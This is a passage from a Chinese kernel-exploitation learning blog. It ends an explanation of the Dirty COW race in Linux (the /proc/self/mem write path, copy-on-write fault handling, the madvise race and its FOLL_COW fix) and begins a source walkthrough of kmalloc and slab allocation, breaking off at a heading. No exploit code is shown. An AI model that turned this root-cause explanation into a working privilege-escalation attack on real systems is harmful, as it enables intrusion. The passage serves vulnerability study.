<h2 id="b2-procselfmem的写入流程"><a class="markdownIt-Anchor" href="#b2-procselfmem的写入流程"></a> B.2 /proc/self/mem的写入流程</h2>
<p>（下面的函数名前面加@的带链接可跳转查看）</p>
<p>这是一个/proc目录下的特殊文件，/proc/self表示当前进程，而mem则作为一个虚拟文件，表示当前进程的内存空间。</p>
<p>我们都知道，当用户程序通过open函数打开一个文件时，内核会为用户程序返回一个文件描述符，用户程序后续可通过这个文件描述符整数对文件进行操作。为了将文件操作与不同文件（普通文件、进程文件、设备文件等）解耦合，Linux设计了一个<code>file_operations</code>结构体，对文件描述符进行读、写等操作时，在内核中实际上是在执行<code>file_operations</code>中的读写函数。</p>
<p>而对于/proc目录下表示内存的文件，Linux内核定义了属于这些文件的<code>file_operations</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> =</span> &#123;</span><br><span class="line">	.llseek		= mem_lseek,</span><br><span class="line">	.read		= mem_read,</span><br><span class="line">	.write		= mem_write,</span><br><span class="line">	.open		= mem_open,</span><br><span class="line">	.release	= mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>也即打开/proc/self/mem后，我们调用<code>write</code>函数实际上在内核调用的是<code>mem_write</code>。通过查看源码发现，它实际上调用的是@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/fs/proc/base.c#L845"><code>mem_rw</code></a>：</p>
<ul>
<li>内核首先会通过<code>__get_free_page</code>获得一个临时的空闲内存页</li>
<li>使用<code>copy_from_user</code>将当前进程的内存数据复制到临时页。</li>
<li>调用<code>access_remote_vm</code>对临时内存进行访问，完成读写操作。</li>
</ul>
<p>而对于<code>access_remote_vm</code>（全部逻辑在@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3854"><code>__access_remote_vm</code></a>），主要操作包括：</p>
<ul>
<li>调用<code>down_read</code>为内存上读锁。</li>
<li>进入循环：
<ul>
<li>调用<code>get_user_pages_remote</code>函数，获取要读或写的内存页的物理地址。</li>
<li>如果内存页获取失败，进行其他处理。</li>
<li>内存页获取成功后，每一次以一页为单位进行读或写操作，首先计算要操作的内存大小，随后调用<code>kmap</code>将要操作的内存映射到一个内核内存页中。</li>
<li>如果操作为写，则调用<code>copy_to_user_page</code>向映射的内存页写入数据，并设置内存页为脏页（<code>set_page_dirty_lock</code>）</li>
<li>调用<code>kunmap</code>解除映射，并删除cache中的对应项。</li>
</ul>
</li>
<li>调用<code>up_read</code>为内存解锁读锁。</li>
</ul>
<p>那么这里面的重点就在于<code>get_user_pages_remote</code>，它是如何获取物理地址的。调用链为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get_user_pages_remote</span><br><span class="line">  __get_user_pages_locked</span><br><span class="line">    __get_user_pages</span><br></pre></td></tr></table></figure>
<p>主要逻辑都在后面两个函数中。首先看到@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/gup.c#L728"><code>__get_user_pages_locked</code></a>。这个函数中有一个大循环，其中调用了两次@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/gup.c#L519"><code>__get_user_pages</code></a>，这个函数内部的逻辑大概为：</p>
<ul>
<li>定义一个<code>vm_area_struct</code>实例<code>vma</code>初始化为空。<code>vma</code>表示虚拟内存区域，通常与一页或多页相关联。</li>
<li>一个大循环。
<ul>
<li>如果<code>vma</code>为空或要获取的地址超过了<code>vma</code>的范围：
<ul>
<li>调用<code>find_extend_vma</code>函数获取<code>vma</code>。</li>
<li>进行其他的处理，完成后返回或继续进行下一页处理。</li>
</ul>
</li>
<li>调用<code>follow_page_mask</code>获取给定虚拟地址对应的物理页。</li>
<li>如果没有获取到，可能原因是对应物理页不存在或没有写权限：
<ul>
<li>调用<code>faultin_page</code>进行缺页异常处理。</li>
<li>如果处理成功则重试，跳转到调用<code>follow_page_mask</code>之前；否则返回或处理下一页。</li>
</ul>
</li>
<li>否则如果页表不存在，则处理下一页。</li>
<li>否则如果返回错误值，立即返回。</li>
<li>进行页面的其他处理，刷新计数器。</li>
</ul>
</li>
</ul>
<p>下面看到@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/gup.c#L354"><code>faultin_page</code></a>。这个函数里涉及大量针对flags参数的判断与修改，根据源码分析发现，传入这个函数的flags参数为<code>FOLL_TOUCH | FOLL_REMOTE | FOLL_GET | FOLL_WRITE | FOLL_FORCE</code>：</p>
<ul>
<li>进行一系列判断与变量修改。</li>
<li>调用<code>handle_mm_fault</code>处理缺页异常，分配有效物理内存页。</li>
<li>根据<code>handle_mm_fault</code>函数返回值进行其他处理。</li>
<li>如果需要写且有写权限，则去除<code>flags</code>中的<code>FOLL_WRITE</code>标志位。</li>
</ul>
<p>在@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3619"><code>handle_mm_fault</code></a>中，首先检查虚拟内存的权限，如果发现虚拟内存无效会给出SIGSEGV信号并返回。主要逻辑在@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3566"><code>__handle_mm_fault</code></a>中。</p>
<p>在<code>__handle_mm_fault</code>中，将会从一级页表PGD依次向下获取页目录，若分配失败，表示内存不足，会返回<code>VM_FAULT_OOM</code>。中间经过一系列处理后调用@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3478"><code>handle_pte_fault</code></a>继续进行处理。</p>
<p>在<code>handle_pte_fault</code>中，由于上一级函数已经创建PMD三级页目录项，因此会进入第一个if语句将<code>fe-&gt;pte</code>设置为空，由此进入第二个if语句。根据代码分析可知，目前分析的调用链所处理的<code>vma</code>不是匿名<code>vma</code>，因此会调用@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3313"><code>do_fault</code></a>处理后直接返回，下面的代码不会执行。</p>
<p>在<code>do_fault</code>中，由于我们处理的是写的异常，因此会跳过前两个判断，进入第三个if语句调用@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L3200"><code>do_cow_fault</code></a>，即处理写时复制所导致的缺页异常。</p>
<p>在<code>do_cow_fault</code>中：</p>
<ul>
<li>调用了<code>alloc_page_vma</code>函数分配一个新的内存页。</li>
<li>调用<code>__do_fault</code>处理异常。</li>
<li>调用<code>alloc_set_pte</code>函数将新分配的内存页更新到PTE中。</li>
</ul>
<p>到这里，<code>__get_user_pages</code>函数就成功调入了这个内存页，并将其地址存放到了页表项中。随后会通过<code>goto retry</code>再一次调用<code>follow_page_mask</code>。在第二次调用中，由于内核能够找到相应的页表项，因此在<code>handle_pte_fault</code>中会执行后面的代码。后面由于需要进行写操作，因此会调用<code>pte_write</code>函数判断页面是否可写，这里显然是不可写。这样就会调用@<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.8.2/source/mm/memory.c#L2359"><code>do_wp_page</code></a>并返回。</p>
<p>在<code>do_wp_page</code>中，由于页面本身不可写，因此不能对页面进行共享，而是只能进行复制（使用<code>wp_page_copy</code>），而复制后的内存页只属于需要进行COW的进程，因此<code>faultin_page</code>会给予写权限，本次调用成功返回。随后<code>follow_page_mask</code>第三次来到retry标号处，随后就可以使用<code>follow_page_mask</code>成功获取一个符合权限的存在的内存页，COW流程结束。</p>
<h2 id="b3-madvise"><a class="markdownIt-Anchor" href="#b3-madvise"></a> B.3 madvise</h2>
<p>madvise的一种易懂的理解是，我们用户给内核有关于某一段内存的使用建议，告诉内核应该如何使用某一段内存。建议分为多种，下面是Linux源码中的注释：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The madvise(2) system call.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Applications can use madvise() to advise the kernel how it should</span></span><br><span class="line"><span class="comment"> * handle paging I/O in this VM area.  The idea is to help the kernel</span></span><br><span class="line"><span class="comment"> * use appropriate read-ahead and caching techniques.  The information</span></span><br><span class="line"><span class="comment"> * provided is advisory only, and can be safely disregarded by the</span></span><br><span class="line"><span class="comment"> * kernel without affecting the correct operation of the application.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * behavior values:</span></span><br><span class="line"><span class="comment"> *  ...</span></span><br><span class="line"><span class="comment"> *  MADV_DONTNEED - the application is finished with the given range,</span></span><br><span class="line"><span class="comment"> *		so the kernel can free resources associated with it.</span></span><br><span class="line"><span class="comment"> *  ...</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>这里我们只关注<code>MADV_DONTNEED</code>这个选项，它表示应用程序已经不再需要这段内存，可以让内核调出这些内存页。注意调出不是释放，而是暂时不用。</p>
<h1 id="c-漏洞点"><a class="markdownIt-Anchor" href="#c-漏洞点"></a> C. 漏洞点</h1>
<p>上面的分析中，尤其是COW的流程难以理解，需要细细咀嚼。</p>
<p>而这个著名CVE到底是如何产生的呢？</p>
<p>需要注意的是，我们进行映射的那个文件原本是不可写的，打开的时候也没有尝试获取写权限，但问题是，我们可以直接访问当前进程的内存空间虚拟文件/proc/self/mem，而这个文件是具有写权限的。</p>
<p>这就造成了一个问题：我通过打开这个虚拟文件对那块不可写的内存空间强行写入会怎样？这个问题我们在上面的分析中已经得到了答案——内核会通过COW机制让本次写操作写入的是那块映射内存空间的复制页，如果我们不同时使用madvise竞争，写入操作不会直接对映射内存写入。这样即满足了映射空间不可写的权限，也满足了写入的要求。</p>
<p>但现在，我们使用了madvise系统调用。如果我们在第二次调用<code>follow_page_mask</code>之后让madvise将本来分配到的内存页又给调出去了，这样的话第三次调用<code>follow_page_mask</code>就不能正常获取内存页，但此时保存页面权限的变量<code>foll_flags</code>已经添加了可写权限。因此<code>follow_page_mask</code>第三次调用会将原来的文件的只读映射副本重新调入（因为此时<code>foll_flags</code>已经添加了写权限，内核误以为原本映射的内存页可写），这就造成了条件竞争漏洞，最终在第四次调用<code>follow_page_mask</code>时获取到原来的只读副本并且能够成功写入。</p>
<p><img src="1.png" alt="" /></p>
<h1 id="d-修复"><a class="markdownIt-Anchor" href="#d-修复"></a> D. 修复</h1>
<p>经过了一番分析之后，我们总算是理解了这个著名漏洞的成因，即权限变量与内存页分离不同时存在导致可能产生条件竞争。那么要想修复这个问题，最为简单的方法就是将二者进行绑定，不使用临时变量判断页面的权限，而是直接将页面权限字段加入到内存页实例中，这样，即使madvise成功调出了原先只读的物理页，<code>follow_page_mask</code>获取到的也依然是只读的物理页。</p>
<p>从ChangeLog可知，Linus Torvalds解决这个问题的方式比上面的方式更简单，他添加了一个<code>FOLL_COW</code>常量，专门用来处理COW流程，当要写入的内存页成功申请后，为变量添加<code>FOLL_COW</code>而不是<code>FOLL_WRITE</code>，将二者区分开来，这样不必修改表示内存页的结构体本身。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/02/07/Kernel-pwn-%E5%85%A5%E9%97%A8-9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/07/Kernel-pwn-%E5%85%A5%E9%97%A8-9/" class="post-title-link" itemprop="url">Kernel pwn 入门 (9)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-02-07 11:25:46" itemprop="dateCreated datePublished" datetime="2024-02-07T11:25:46+08:00">2024-02-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-02-08 11:30:17" itemprop="dateModified" datetime="2024-02-08T11:30:17+08:00">2024-02-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文笔者计划简要分析kmalloc以及kfree的主要分支流程。</p>
<p>注：本文分析使用的Linux版本为6.7.4.</p>
<h1 id="kmalloc"><a class="markdownIt-Anchor" href="#kmalloc"></a> kmalloc</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline __alloc_size(<span class="number">1</span>) <span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">size_t</span> size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">			<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">		index = kmalloc_index(size);</span><br><span class="line">		<span class="keyword">return</span> kmalloc_trace(</span><br><span class="line">				kmalloc_caches[kmalloc_type(flags, _RET_IP_)][index],</span><br><span class="line">				flags, size);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>kmalloc有两个参数，第一个为要分配的大小，第二个为分配选项。根据Linux kernel源代码注释，分配选项主要用于确定分配方式，最为常用的是GFP_KERNEL，可能会出现一定的sleep；另外还有GFP_NOWAIT（必须立即分配）与GFP_ATOMIC（必须立即分配且可能使用紧急内存池-emergency pools），除了3个主选项外还有几个副选项，可用于内核在分配后立即清空这块空间内的内容（__GFP_ZERO，实际上kzalloc也是调用的kmalloc，加上了这个选项），忽略分配失败警告等。</p>
<p>这个函数内首先有一个判断，<code>__builtin_constant_p</code>是一个gcc的内置函数，用于判断一个值是否是常量，使用这个函数主要是用于优化函数性能。在函数内部判断size，如果大于<code>KMALLOC_MAX_CACHE_SIZE</code>（x64中为8192）则转向分配大块空间的函数。随后调用<code>kmalloc_index</code>函数根据size判断需要在哪个<code>kmem_cache</code>里面完成分配工作。不同的<code>kmem_cache</code>中保存的内存块size可能不同，但一个<code>kmem_cache</code>中可分配的内存块size相同。由于这些<code>kmem_cache</code>在内核启动时完成初始化，因此索引是固定的。这里<code>kmalloc_caches</code>是一个二维的<code>kmem_cache*</code>数组，第一维表示的是内存块的类型，有通用类型、专用于DMA类型等多种类型。第二维表示索引。</p>
<h1 id="kmalloc_trace"><a class="markdownIt-Anchor" href="#kmalloc_trace"></a> kmalloc_trace</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">kmalloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> gfpflags, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,</span><br><span class="line">					    size, _RET_IP_);</span><br><span class="line"></span><br><span class="line">	trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);</span><br><span class="line"></span><br><span class="line">	ret = kasan_kmalloc(s, ret, size, gfpflags);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmalloc_trace);</span><br></pre></td></tr></table></figure>
<p>这里最后有一个<code>kasan_kmalloc</code>，它的主要功能是缓解针对内核内存管理器的攻击，没有对要分配的内存块本身进行任何操作，这里跳过。分配内存的主要逻辑在<code>__kmem_cache_alloc_node -&gt; slab_alloc_node</code>中。</p>
<h1 id="slab_alloc_node"><a class="markdownIt-Anchor" href="#slab_alloc_node"></a> slab_alloc_node</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">slab_alloc_node</span><span class="params">(<span class="keyword">struct</span> kmem_cache *cachep, <span class="keyword">struct</span> list_lru *lru, <span class="type">gfp_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> nodeid, <span class="type">size_t</span> orig_size, <span class="type">unsigned</span> <span class="type">long</span> caller)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> save_flags;</span><br><span class="line">	<span class="type">void</span> *objp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">obj_cgroup</span> *<span class="title">objcg</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">bool</span> init = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	flags &amp;= gfp_allowed_mask;</span><br><span class="line">	cachep = slab_pre_alloc_hook(cachep, lru, &amp;objcg, <span class="number">1</span>, flags);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!cachep))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	objp = kfence_alloc(cachep, orig_size, flags);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(objp))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	local_irq_save(save_flags);</span><br><span class="line">	objp = __do_cache_alloc(cachep, flags, nodeid);</span><br><span class="line">	local_irq_restore(save_flags);</span><br><span class="line">	objp = cache_alloc_debugcheck_after(cachep, flags, objp, caller);</span><br><span class="line">	prefetchw(objp);</span><br><span class="line">	init = slab_want_init_on_alloc(flags, cachep);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	slab_post_alloc_hook(cachep, objcg, flags, <span class="number">1</span>, &amp;objp, init,</span><br><span class="line">				cachep-&gt;object_size);</span><br><span class="line">	<span class="keyword">return</span> objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数内部首先调用了一个<code>slab_pre_alloc_hook</code>，这是一个预处理钩子函数，查看源码发现主要完成一些检查工作，并不重要，后面的<code>slab_post_alloc_hook</code>是后处理钩子函数。这里核心的处理函数是<code>__do_cache_alloc</code>，它是所有内核内存分配函数都需要调用的。</p>
<h1 id="__do_cache_alloc"><a class="markdownIt-Anchor" href="#__do_cache_alloc"></a> __do_cache_alloc</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line">__do_cache_alloc(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">gfp_t</span> flags, <span class="type">int</span> nodeid)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *objp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> slab_node = numa_mem_id();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nodeid == NUMA_NO_NODE) &#123;</span><br><span class="line">		<span class="keyword">if</span> (current-&gt;mempolicy || cpuset_do_slab_mem_spread()) &#123;</span><br><span class="line">			objp = alternate_node_alloc(cachep, flags);</span><br><span class="line">			<span class="keyword">if</span> (objp)</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Use the locally cached objects if possible.</span></span><br><span class="line"><span class="comment">		 * However ____cache_alloc does not allow fallback</span></span><br><span class="line"><span class="comment">		 * to other nodes. It may fail while we still have</span></span><br><span class="line"><span class="comment">		 * objects on other nodes available.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		objp = ____cache_alloc(cachep, flags);</span><br><span class="line">		nodeid = slab_node;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nodeid == slab_node) &#123;</span><br><span class="line">		objp = ____cache_alloc(cachep, flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!get_node(cachep, nodeid)) &#123;</span><br><span class="line">		<span class="comment">/* Node not bootstrapped yet */</span></span><br><span class="line">		objp = fallback_alloc(cachep, flags);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We may just have run out of memory on the local node.</span></span><br><span class="line"><span class="comment">	 * ____cache_alloc_node() knows how to locate memory on other nodes</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!objp)</span><br><span class="line">		objp = ____cache_alloc_node(cachep, flags, nodeid);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在默认情况下，<code>CONFIG_NUMA</code>开启，调用的是上面的函数，若没有开启则用于表示NUMA节点的参数node无效，转而直接调用<code>____cache_alloc</code>函数。NUMA节点这个参数是Linux 6.1才添加到<code>__do_cache_alloc</code>函数中的。</p>
<blockquote>
<p>NUMA 全称 Non-Uniform Memory Access，译为“非一致性内存访问”。这种构架下，不同的内存器件和CPU核心从属不同的 Node，每个 Node 都有自己的集成内存控制器（IMC，Integrated Memory Controller）。</p>
</blockquote>
<p>通过kmalloc调用传入的node参数实际上总为-1，即让系统自行决定节点，也就是走<code>if (nodeid == NUMA_NO_NODE)</code>内部。不过无论如何最终都需要调用<code>____cache_alloc</code>。</p>
<h1 id="____cache_alloc"><a class="markdownIt-Anchor" href="#____cache_alloc"></a> ____cache_alloc</h1>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *____cache_alloc(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *objp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span>;</span></span><br><span class="line"></span><br><span class="line">	check_irq_off();</span><br><span class="line"></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line">	<span class="keyword">if</span> (likely(ac-&gt;avail)) &#123;</span><br><span class="line">		ac-&gt;touched = <span class="number">1</span>;</span><br><span class="line">		objp = ac-&gt;entry[--ac-&gt;avail];</span><br><span class="line"></span><br><span class="line">		STATS_INC_ALLOCHIT(cachep);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	STATS_INC_ALLOCMISS(cachep);</span><br><span class="line">	objp = cache_alloc_refill(cachep, flags);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * the &#x27;ac&#x27; may be updated by cache_alloc_refill(),</span></span><br><span class="line"><span class="comment">	 * and kmemleak_erase() requires its correct value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * To avoid a false negative, if an object that is in one of the</span></span><br><span class="line"><span class="comment">	 * per-CPU caches is leaked, we need to make sure kmemleak doesn&#x27;t</span></span><br><span class="line"><span class="comment">	 * treat the array pointers as a reference to the object.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (objp)</span><br><span class="line">		kmemleak_erase(&amp;ac-&gt;entry[ac-&gt;avail]);</span><br><span class="line">	<span class="keyword">return</span> objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关于这个函数的解释，可以参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/358891862">资料</a>，这里添加一些方便理解的补充。</p>
<p><code>cpu_cache_get</code>返回的是<code>kmem_cache</code>中定义的CPU专用的空闲对象链表。不过这个结构说是链表，实际上它还是通过数组的形式实现的，从上面的代码可以看出，<code>objp = ac-&gt;entry[--ac-&gt;avail];</code>这条语句表明这里的空闲的obj是直接通过下标索引的，相比传统链表大大提高效率。当这里没有可用的对象时，会调用<code>cache_alloc_refill</code>继续查找可用对象。</p>
<h1 id="cache_alloc_refill"><a class="markdownIt-Anchor" href="#cache_alloc_refill"></a> cache_alloc_refill</h1>
